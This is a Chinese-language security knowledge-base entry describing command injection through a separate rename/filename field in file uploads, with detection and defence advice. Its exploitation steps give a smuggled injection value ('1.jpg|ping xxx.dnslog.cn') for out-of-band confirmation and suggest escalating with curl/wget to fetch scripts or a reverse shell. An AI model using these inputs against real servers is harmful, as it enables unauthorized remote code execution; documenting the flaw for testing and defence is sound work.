---
id: upload-filename-param-rename-cmdi
title: 上传重命名字段拼接系统 rename/ping 命令导致命令注入 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: 文件名参数命令注入
tags:
- file-upload
- command-injection
- rce
severity: critical
confidence: medium
status: draft
created: '2026-11-08'
updated: '2026-11-08'
url: /docs/web/generic/file-upload/upload-filename-param-rename-cmdi/
draft: false
kb_aliases:
- rename 注入
- 文件名 cmdi
---

# 上传重命名字段拼接系统 rename/ping 命令导致命令注入 RCE

## 一句话结论

上传请求中除 multipart 的 filename 外还出现独立文件名参数（如 `name=1.jpg`）时，服务端可能把它拼进 `rename`/`mv`/图片处理等系统命令；在参数值后追加 `| command`（或 `;`、反引号）即可注入任意命令，经 DNSLog 外带验证实现 RCE。

## 原理

"两处出现文件名"是关键特征：multipart part 自带 filename（浏览器生成），另一个表单字段 name 由业务用于重命名/分类。若后端用字符串拼接方式调用系统命令（如 `rename old new`、`convert`、缩略图处理），用户值未做转义时管道符后的命令同样被 shell 执行。验证用无回显外带：注入 `|ping xxx.dnslog.cn`，DNS 平台出现解析记录即证明命令执行。

## 触发条件

- 上传请求存在独立文件名/重命名参数；
- 服务端将该参数拼接进 shell 命令且未过滤 `|;&`$()` 等元字符；
- 目标主机允许出网 DNS（或可用的其他外带通道）。

## 利用步骤

1. 上传抓包识别两个文件名参数（`filename="3.png"` 与 `name=1.jpg`）。
2. name 值改为 `1.jpg|ping xxx.dnslog.cn`。
3. 查看 DNSLog 平台收到解析记录确认命令执行。
4. 换用 `curl`/`wget` 拉取脚本或反弹 shell 载荷完成 RCE。

## PoC

无 PoC（注入点与验证如上；原文验证：name=1.jpg|ping dnslog 后 DNS Query Record 出现对应记录与 IP）。

## 变体与关联

- 变体：图片处理参数（宽度/水印文字/旋转角度）拼进 ImageMagick/ffmpeg 命令；导出文件名拼进 zip/tar 命令。
- 关联：上传路径可控（同属上传字段进入危险函数）；SSRF/文件读取（后渗透信息收集）。

## 检测与防御

- 检测：文件名参数含 shell 元字符、Web 进程产生异常子进程（busybox/ping/curl 由 www 用户启动）。
- 防御：禁用 shell 拼接（用语言原生 rename/图片库）、白名单校验文件名字符集（仅 `[A-Za-z0-9._-]`）、最小权限运行。
